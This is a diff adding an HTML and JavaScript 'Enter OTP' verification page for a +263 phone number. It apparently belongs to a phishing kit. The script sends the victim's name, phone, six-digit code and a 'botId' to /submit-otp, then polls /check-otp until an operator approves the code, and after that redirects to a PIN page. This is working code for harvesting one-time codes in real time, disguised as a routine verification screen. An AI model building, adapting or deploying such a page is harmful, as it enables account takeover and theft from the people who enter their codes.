@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verify Your Number</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #fff;
+            color: #222;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .top-bar {
+            height: 72px;
+            background: #0d47a1;
+            display: flex;
+            align-items: center;
+            padding: 0 22px;
+            flex-shrink: 0;
+        }
+        .back-btn {
+            color: #fff;
+            font-size: 30px;
+            text-decoration: none;
+            font-weight: 300;
+        }
+        .container {
+            flex: 1;
+            width: 100%;
+            max-width: 420px;
+            margin: 0 auto;
+            padding: 28px 24px 20px;
+            display: flex;
+            flex-direction: column;
+        }
+        .title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #0d47a1;
+            margin-bottom: 4px;
+            letter-spacing: -0.3px;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #555;
+            line-height: 1.5;
+            margin-bottom: 4px;
+        }
+        .wrong-number {
+            font-size: 15px;
+            color: #0d47a1;
+            text-decoration: none;
+            font-weight: 500;
+            display: inline-block;
+            margin-bottom: 16px;
+            margin-top: 2px;
+        }
+        .wrong-number:hover {
+            text-decoration: underline;
+        }
+        .valid-time {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 24px;
+        }
+        .otp {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            justify-content: flex-start;
+        }
+        .otp input {
+            width: 50px;
+            height: 56px;
+            border: 2px solid #d0d7de;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 500;
+            outline: none;
+            background: #fff;
+            transition: border 0.2s, box-shadow 0.2s;
+        }
+        .otp input:focus {
+            border-color: #0d47a1;
+            box-shadow: 0 0 0 3px rgba(13, 71, 161, 0.15);
+        }
+        .resend-wrap {
+            color: #666;
+            font-size: 15px;
+            margin-bottom: 0;
+        }
+        .resend-wrap .timer {
+            font-weight: 600;
+            color: #0d47a1;
+        }
+        .continue-btn {
+            position: fixed;
+            left: 24px;
+            right: 24px;
+            bottom: 28px;
+            height: 56px;
+            border: none;
+            border-radius: 10px;
+            background: #b7cff0;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: not-allowed;
+            transition: background 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            max-width: 420px;
+            margin: 0 auto;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        .continue-btn:enabled {
+            background: #0d47a1;
+            cursor: pointer;
+        }
+        .continue-btn:enabled:hover {
+            background: #0a3a8a;
+        }
+        #message-box {
+            display: none;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 22px 18px 16px;
+            }
+            .title {
+                font-size: 24px;
+            }
+            .otp input {
+                width: 44px;
+                height: 50px;
+                font-size: 20px;
+            }
+            .continue-btn {
+                height: 54px;
+                font-size: 18px;
+                left: 18px;
+                right: 18px;
+                bottom: 22px;
+            }
+        }
+        @media (max-width: 360px) {
+            .otp input {
+                width: 38px;
+                height: 46px;
+                font-size: 18px;
+            }
+            .otp {
+                gap: 6px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="top-bar">
+        <a href="#" class="back-btn">&#8592;</a>
+    </div>
+
+    <div class="container">
+
+        <div class="title">Enter OTP</div>
+
+        <!-- Subtitle will be filled from localStorage -->
+        <div class="subtitle" id="subtitlePlaceholder">
+            Enter OTP that was sent to (+263) 712345678
+        </div>
+
+        <a href="#" class="wrong-number">Wrong Number?</a>
+
+        <div class="valid-time">The code is valid for 5 minutes</div>
+
+        <div class="otp">
+            <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        </div>
+
+        <!-- Resend area – initial text in English, script will overwrite with timer -->
+        <div class="resend-wrap">
+            Resend code in <span class="timer">05:00</span>
+        </div>
+
+    </div>
+
+    <!-- Button initial text in English -->
+    <button class="continue-btn">SUBMIT</button>
+
+    <!-- ====== SCRIPT TO DISPLAY PHONE FROM LOCALSTORAGE ====== -->
+    <script>
+        (function() {
+            const phone = localStorage.getItem('phone');
+            const subtitle = document.getElementById('subtitlePlaceholder');
+            if (phone) {
+                subtitle.textContent = 'Enter OTP that was sent to ' + phone;
+            }
+        })();
+    </script>
+
+    <!-- ====== TRANSLATION LAYER (does NOT change logic) ====== -->
+    <script>
+        (function() {
+            // This script watches the DOM for French strings inserted by the main logic
+            // and replaces them with English equivalents – without touching the original script.
+            const translations = {
+                'Renvoyer le code dans': 'Resend code in',
+                'Renvoyer le code': 'Resend code',
+                'Vérification...': 'Verifying...',
+                'Continuer': 'Continue',
+                'Nom manquant – veuillez revenir à l\'étape précédente pour saisir votre nom.': 'Name missing – please go back and enter your name.',
+                'Numéro de téléphone manquant – veuillez recommencer.': 'Phone number missing – please restart.',
+                'Identifiant du bot manquant – veuillez utiliser le lien correct.': 'Bot ID missing – please use the correct link.',
+                'Code incorrect. Veuillez réessayer.': 'Incorrect code. Please try again.',
+                'Erreur serveur': 'Server error',
+                'Aucun ID reçu': 'No ID received',
+                'Erreur lors du contrôle': 'Verification error',
+                'Erreur de vérification :': 'Verification error:',
+                'Erreur lors de l\'envoi :': 'Send error:'
+            };
+
+            // Replace text in a node (only text nodes)
+            function translateNode(node) {
+                if (node.nodeType === Node.TEXT_NODE) {
+                    let text = node.textContent;
+                    let changed = false;
+                    for (const [fr, en] of Object.entries(translations)) {
+                        if (text.includes(fr)) {
+                            text = text.replace(fr, en);
+                            changed = true;
+                        }
+                    }
+                    if (changed) {
+                        node.textContent = text;
+                    }
+                } else if (node.nodeType === Node.ELEMENT_NODE) {
+                    // Recursively process child nodes
+                    node.childNodes.forEach(child => translateNode(child));
+                }
+            }
+
+            // Observe changes to the container and the resend-wrap
+            const targetNodes = [document.querySelector('.container'), document.querySelector('.resend-wrap')];
+            const observer = new MutationObserver(() => {
+                targetNodes.forEach(el => {
+                    if (el) translateNode(el);
+                });
+                // Also translate the message box if it appears
+                const msgBox = document.getElementById('message-box');
+                if (msgBox) translateNode(msgBox);
+                // Translate button text if it changes
+                const btn = document.querySelector('.continue-btn');
+                if (btn) translateNode(btn);
+            });
+
+            // Start observing
+            targetNodes.forEach(el => {
+                if (el) {
+                    observer.observe(el, { childList: true, subtree: true, characterData: true });
+                }
+            });
+
+            // Run immediately once
+            setTimeout(() => {
+                targetNodes.forEach(el => {
+                    if (el) translateNode(el);
+                });
+                const msgBox = document.getElementById('message-box');
+                if (msgBox) translateNode(msgBox);
+                const btn = document.querySelector('.continue-btn');
+                if (btn) translateNode(btn);
+            }, 100);
+        })();
+    </script>
+
+    <!-- ======== YOUR ORIGINAL SCRIPTS (UNTOUCHED) ======== -->
+    <script>
+        (function() {
+            // ── 1. Get parameters from URL and localStorage ──
+            const urlParams = new URLSearchParams(window.location.search);
+            let botId = urlParams.get('botId') || localStorage.getItem('botId');
+            let name = urlParams.get('name') || localStorage.getItem('name');
+            let phone = urlParams.get('phone') || localStorage.getItem('phone');
+
+            if (!name) {
+                name = localStorage.getItem('fullName');
+                if (name) localStorage.setItem('name', name);
+            }
+
+            if (!phone) {
+                const subtitle = document.querySelector('.subtitle');
+                const match = subtitle.textContent.match(/\((\+?\d+)\)\s*(\d+)/);
+                if (match) phone = match[1] + match[2];
+                if (phone) localStorage.setItem('phone', phone);
+            }
+
+            if (botId) localStorage.setItem('botId', botId);
+
+            const container = document.querySelector('.container');
+            const msgDiv = document.createElement('div');
+            msgDiv.id = 'message-box';
+            msgDiv.style.display = 'none';
+            msgDiv.style.padding = '12px 16px';
+            msgDiv.style.borderRadius = '8px';
+            msgDiv.style.marginBottom = '20px';
+            msgDiv.style.fontSize = '15px';
+            msgDiv.style.fontWeight = '500';
+            msgDiv.style.transition = 'all 0.2s ease';
+            const resendWrap = document.querySelector('.resend-wrap');
+            container.insertBefore(msgDiv, resendWrap);
+
+            function showMessage(text, isError = true) {
+                msgDiv.textContent = text;
+                msgDiv.style.display = 'block';
+                msgDiv.style.background = isError ? '#fde7e7' : '#e7f5e7';
+                msgDiv.style.color = isError ? '#b00020' : '#1e7e34';
+                msgDiv.style.border = isError ? '1px solid #f5c6cb' : '1px solid #b7d7b7';
+            }
+
+            function hideMessage() {
+                msgDiv.style.display = 'none';
+                msgDiv.textContent = '';
+            }
+
+            const inputs = document.querySelectorAll('.otp input');
+            const continueBtn = document.querySelector('.continue-btn');
+
+            function sanitizeDigit(value) {
+                return value.replace(/\D/g, '');
+            }
+
+            function checkAllFilled() {
+                let allFilled = true;
+                inputs.forEach(input => {
+                    if (input.value.trim() === '') allFilled = false;
+                });
+                if (allFilled) {
+                    continueBtn.disabled = false;
+                    continueBtn.style.background = '#0d47a1';
+                    continueBtn.style.cursor = 'pointer';
+                } else {
+                    continueBtn.disabled = true;
+                    continueBtn.style.background = '#b7cff0';
+                    continueBtn.style.cursor = 'not-allowed';
+                }
+            }
+
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', function() {
+                    const cleaned = sanitizeDigit(this.value);
+                    if (cleaned !== this.value) {
+                        this.value = cleaned;
+                    }
+                    if (this.value.length === 1) {
+                        if (index < inputs.length - 1) {
+                            inputs[index + 1].focus();
+                        }
+                    }
+                    checkAllFilled();
+                    hideMessage();
+                });
+
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const paste = (e.clipboardData || window.clipboardData).getData('text');
+                    const digits = sanitizeDigit(paste);
+                    if (digits) {
+                        this.value = digits.slice(0, 1);
+                        this.dispatchEvent(new Event('input'));
+                    }
+                });
+
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+
+                input.addEventListener('blur', checkAllFilled);
+            });
+
+            const timerSpan = document.querySelector('.timer');
+            const resendWrapEl = document.querySelector('.resend-wrap');
+            let totalSeconds = 5 * 60;
+            let interval = null;
+
+            function formatTime(sec) {
+                const m = String(Math.floor(sec / 60)).padStart(2, '0');
+                const s = String(sec % 60).padStart(2, '0');
+                return `${m}:${s}`;
+            }
+
+            function updateTimerUI() {
+                if (totalSeconds <= 0) {
+                    resendWrapEl.innerHTML = 'Renvoyer le code';
+                    resendWrapEl.style.color = '#1976d2';
+                    resendWrapEl.style.cursor = 'pointer';
+                    resendWrapEl.style.fontWeight = '600';
+                    clearInterval(interval);
+                    interval = null;
+                    resendWrapEl.onclick = function(e) {
+                        e.preventDefault();
+                        startTimer(5 * 60);
+                        hideMessage();
+                    };
+                    return;
+                }
+                timerSpan.textContent = `dans ${formatTime(totalSeconds)}`;
+                resendWrapEl.innerHTML = `Renvoyer le code dans <span class="timer">${formatTime(totalSeconds)}</span>`;
+                resendWrapEl.style.color = '#666';
+                resendWrapEl.style.cursor = 'default';
+                resendWrapEl.style.fontWeight = '400';
+                resendWrapEl.onclick = null;
+            }
+
+            function startTimer(seconds) {
+                if (interval) clearInterval(interval);
+                totalSeconds = seconds;
+                updateTimerUI();
+                interval = setInterval(() => {
+                    totalSeconds--;
+                    if (totalSeconds <= 0) {
+                        totalSeconds = 0;
+                        updateTimerUI();
+                        clearInterval(interval);
+                        interval = null;
+                    } else {
+                        updateTimerUI();
+                    }
+                }, 1000);
+            }
+
+            startTimer(5 * 60);
+
+            function hasRequiredData() {
+                if (!name) {
+                    showMessage('Nom manquant – veuillez revenir à l\'étape précédente pour saisir votre nom.', true);
+                    return false;
+                }
+                if (!phone) {
+                    showMessage('Numéro de téléphone manquant – veuillez recommencer.', true);
+                    return false;
+                }
+                if (!botId) {
+                    showMessage('Identifiant du bot manquant – veuillez utiliser le lien correct.', true);
+                    return false;
+                }
+                hideMessage();
+                return true;
+            }
+
+            continueBtn.addEventListener('click', function() {
+                if (this.disabled) return;
+
+                if (!hasRequiredData()) return;
+
+                const otp = Array.from(inputs).map(inp => inp.value).join('');
+
+                continueBtn.disabled = true;
+                continueBtn.textContent = 'Vérification...';
+                continueBtn.style.background = '#f5a623';
+
+                fetch('/submit-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ name, phone, otp, botId })
+                })
+                .then(response => {
+                    if (!response.ok) throw new Error('Erreur serveur');
+                    return response.json();
+                })
+                .then(data => {
+                    const requestId = data.requestId;
+                    if (!requestId) throw new Error('Aucun ID reçu');
+
+                    let pollInterval = setInterval(() => {
+                        fetch(`/check-otp/${requestId}`)
+                            .then(res => {
+                                if (!res.ok) throw new Error('Erreur lors du contrôle');
+                                return res.json();
+                            })
+                            .then(status => {
+                                if (status.approved === true) {
+                                    clearInterval(pollInterval);
+                                    window.location.href = `pin.html?botId=${botId}&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}`;
+                                } else if (status.approved === false) {
+                                    clearInterval(pollInterval);
+                                    showMessage('Code incorrect. Veuillez réessayer.', true);
+                                    continueBtn.disabled = false;
+                                    continueBtn.textContent = 'Continuer';
+                                    continueBtn.style.background = '#0d47a1';
+                                    continueBtn.style.cursor = 'pointer';
+                                    inputs.forEach(inp => inp.value = '');
+                                    checkAllFilled();
+                                    inputs[0].focus();
+                                }
+                            })
+                            .catch(err => {
+                                clearInterval(pollInterval);
+                                showMessage('Erreur de vérification : ' + err.message, true);
+                                continueBtn.disabled = false;
+                                continueBtn.textContent = 'Continuer';
+                                continueBtn.style.background = '#0d47a1';
+                                continueBtn.style.cursor = 'pointer';
+                            });
+                    }, 2000);
+                })
+                .catch(err => {
+                    showMessage('Erreur lors de l\'envoi : ' + err.message, true);
+                    continueBtn.disabled = false;
+                    continueBtn.textContent = 'Continuer';
+                    continueBtn.style.background = '#0d47a1';
+                    continueBtn.style.cursor = 'pointer';
+                });
+            });
+
+            hasRequiredData();
+
+        })();
+    </script>
+
+</body>
+</html>
